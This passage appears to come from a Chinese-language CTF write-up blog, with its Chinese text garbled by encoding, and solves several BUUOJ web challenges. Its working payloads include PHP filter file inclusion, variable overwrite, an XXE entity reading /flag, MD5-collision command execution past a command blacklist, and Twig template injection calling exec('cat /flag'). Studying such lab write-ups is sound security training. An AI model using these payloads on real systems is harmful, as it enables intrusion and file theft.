class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»å–<code>flag.php</code>å†…å®¹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æ–¹æ³•ä¸€</span><br><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br><span class="line">#æ–¹æ³•äºŒ</span><br><span class="line">/index.php?category=php://filter/read/convert.base64-encode/resource=woofers/../flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// flag&#123;bb6c568d-c1cd-4aef-b7bd-ab7c2233db07&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>ä½¿ç”¨<code>dirsearch</code>å‘ç°æœ‰<code>git</code>æºç æ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://2bdf7730-1332-4b14-b414-5dc7200276d0.node4.buuoj.cn:81/ -t 1 --timeout=2 -x 400,403,404,500,503,429</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>GitHack</code>ä¸‹è½½æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/a4d782e91852">CTFä¹‹phpå˜é‡è¦†ç›–æ¼æ´</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># payload-1</span><br><span class="line">/?handsome=flag&amp;flag=handsome</span><br><span class="line"># payload-2</span><br><span class="line">/?yds=flag</span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>æŠ“åŒ…å‘ç°åº”ä¸º<code>XXE</code>ï¼Œæ„é€ æµé‡åŒ…å¦‚ä¸‹å³å¯</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>4ea7c0d3-a5c1-4b83-8691-c7096d35acbd.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=utf-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>145</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://4ea7c0d3-a5c1-4b83-8691-c7096d35acbd.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://4ea7c0d3-a5c1-4b83-8691-c7096d35acbd.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">   <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span> ]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>æ‰“å¼€å‘ç°<code>URL</code>ä¸­å­˜åœ¨<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>ï¼Œä½¿ç”¨å¦‚ä¸‹è„šæœ¬å¾—åˆ°<code>555.png</code>ï¼Œä»¥åŠ<code>index.php</code>å¯¹åº”å­—ç¬¦</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$img</span> = <span class="string">&#x27;TXpVek5UTTFNbVUzTURabE5qYz0&#x27;</span>;</span><br><span class="line"><span class="comment">// echo base64_decode(base64_decode($img));</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$img</span>))); <span class="comment">//555.png</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ss</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$ss</span>)));<span class="comment">//TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•…æ„é€ <code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>å¹¶è§£ç å¾—åˆ°<code>index.php</code>æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixiï½ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=sort%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7157185a-232d-4603-931a-9f61c0d87bea.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://7157185a-232d-4603-931a-9f61c0d87bea.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\t%20/flag</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>389</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://7157185a-232d-4603-931a-9f61c0d87bea.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span></span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p>æ ¹æ®æç¤ºè·å¾—æºç ï¼Œç›´æ¥ç½‘ä¸Šå«–è„šæœ¬ä¸€ä¸ªä¸ªè¯•å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_dir = <span class="string">&#x27;D:\\phpStudy\\phpstudy_pro\\WWW\\src&#x27;</span></span><br><span class="line">file=os.listdir(base_dir)</span><br><span class="line">zz=re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)     <span class="comment">#æ­£åˆ™åŒ¹é…</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file[<span class="number">2663</span>:<span class="number">2665</span>]:</span><br><span class="line">      url=<span class="string">&quot;http://localhost/src/&quot;</span>+i</span><br><span class="line">      f=<span class="built_in">open</span>(base_dir+<span class="string">&quot;\\&quot;</span>+i)   <span class="comment">#æ³¨æ„è·¯å¾„ï¼Œç”¨\\</span></span><br><span class="line">      data=f.read()</span><br><span class="line">      f.close()</span><br><span class="line">      res=zz.findall(data)</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">           payload=url+<span class="string">&quot;?&quot;</span>+j+<span class="string">&quot;=echo 123456&quot;</span></span><br><span class="line">           ret=requests.get(payload)</span><br><span class="line">           <span class="comment"># print(payload)</span></span><br><span class="line">           <span class="keyword">if</span> <span class="string">&quot;123456&quot;</span> <span class="keyword">in</span> ret.text:</span><br><span class="line">              <span class="built_in">print</span>(payload)</span><br><span class="line">              exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code>ä¸º<code>xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>F12å‘ç°<code>hint:&lt;!-- Why not take a closer look at cookies? --&gt;</code></p><p>è®¿é—®<code>flag.php</code>æŠ“åŒ…åå‘ç°ï¼Œåœ¨<code>POST</code>åçš„<code>GET</code>è¯·æ±‚çš„æµé‡çš„<code>cookie</code>ä¸­çš„<code>user</code>å­—æ®µå­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆ<code>payload</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>cd078bc1-3c20-4098-90ab-d2ab8f06ffa1.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://cd078bc1-3c20-4098-90ab-d2ab8f06ffa1.node4.buuoj.cn:81/flag.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=60366b7e3fd3e008617661364746fa76; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>å‘ç°å­˜åœ¨<code>robots.txt</code>ï¼Œè¿›å…¥åçœ‹åˆ°<code>fAke_f1agggg.php</code>ï¼Œè®¿é—®ååœ¨å“åº”å¤´å‘ç°<code>Look_at_me:/fl4g.php</code>ï¼Œè®¿é—®åè·å¾—é¢˜ç›®æºç ï¼Œä½¿ç”¨ç«ç‹æµè§ˆå™¨ä¿®å¤ä¸‹å³å¯ï¼ˆ<code>ALT</code>â€”&gt;æŸ¥çœ‹â€”&gt;ä¿®å¤ç¼–ç ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.wangt.cc/2021/10/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">PHPç‰¹æ€§æ€»ç»“</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=more&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><p>ç‚¹å‡»è·å¾—æºç </p><figure class="highlight php"><table><tr><td 